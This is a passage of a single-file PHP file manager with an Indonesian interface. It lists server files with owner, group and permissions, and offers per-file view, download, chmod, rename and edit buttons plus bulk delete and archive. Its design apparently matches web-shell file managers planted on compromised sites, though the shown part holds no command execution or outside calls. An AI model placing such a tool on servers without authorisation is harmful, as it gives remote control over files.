                $owner_name = function_exists('posix_getpwuid') ? posix_getpwuid($owner_id)['name'] : $owner_id;
                $group_name = function_exists('posix_getgrgid') ? posix_getgrgid($group_id)['name'] : $group_id;

                $user_group_class = (($owner_id !== $current_uid || $group_id !== $current_gid) && ($current_uid !== null || $current_gid !== 
null)) ? 'user-group-diff' : '';
            ?>
            <tr>
                <td class="checkbox-col"><input type="checkbox" name="items[]" value="<?php echo htmlspecialchars($fullpath); ?>"></td>
                <td>
                    <form method="POST" style="display:inline;">
                        <button type="submit" name="view_file" value="<?php echo htmlspecialchars($fullpath); ?>" 
style="background:none;border:none;color:white;cursor:pointer;padding:0;">
                            <?php echo htmlspecialchars($item); ?>
                        </button>
                    </form>
                </td>
                <td><?php echo $size; ?></td>
                <td class="<?php echo $user_group_class; ?>"><?php echo htmlspecialchars($owner_name . ':' . $group_name); ?></td>
                <td><?php echo $perms_string; ?></td>
                <td><?php echo $mod; ?></td>
                <td class="actions-cell">
                    <form method="POST" style="display:inline;">
                        <input type="hidden" name="download" value="<?php echo htmlspecialchars($fullpath); ?>">
                        <button type="submit" class="action-btn">Unduh</button>
                    </form>
                    <form method="POST" style="display:inline;">
                        <input type="hidden" name="chmod" value="<?php echo htmlspecialchars($fullpath); ?>">
                        <input type="text" name="chmod_value" placeholder="755" pattern="[0-7]{3,4}" required style="width:50px; 
vertical-align: middle;">
                        <button type="submit" class="action-btn">Chmod</button>
                    </form>
                    <form method="POST" style="display:inline;">
                        <input type="hidden" name="rename" value="<?php echo htmlspecialchars($fullpath); ?>">
                        <input type="text" name="rename_new" placeholder="Ganti nama menjadi" required style="width:120px; vertical-align: 
middle;">
                        <button type="submit" class="action-btn">Ganti Nama</button>
                    </form>
                    <form method="POST" style="display:inline;">
                        <input type="hidden" name="edit_file" value="<?php echo htmlspecialchars($fullpath); ?>">
                        <button type="submit" class="action-btn">Edit</button>
                    </form>
                </td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>

    <div style="margin-bottom:15px;">
        <label for="bulk_action">Tindakan Massal:</label>
        <select name="bulk_action" id="bulk_action" required>
            <option value="">-- Pilih --</option>
            <option value="delete">Hapus</option>
            <option value="zip">Kompres ke compress.zip</option>
            <option value="tar">Kompres ke compress.tar.gz</option>
        </select>
        <input type="submit" value="Terapkan">
    </div>
</form>

<script>
    document.getElementById('checkAll').addEventListener('click', function(){
        var checked = this.checked;
        document.querySelectorAll('input[name="items[]"]').forEach(function(chk){
            chk.checked = checked;
        });
    });
</script>

</body>

</html>

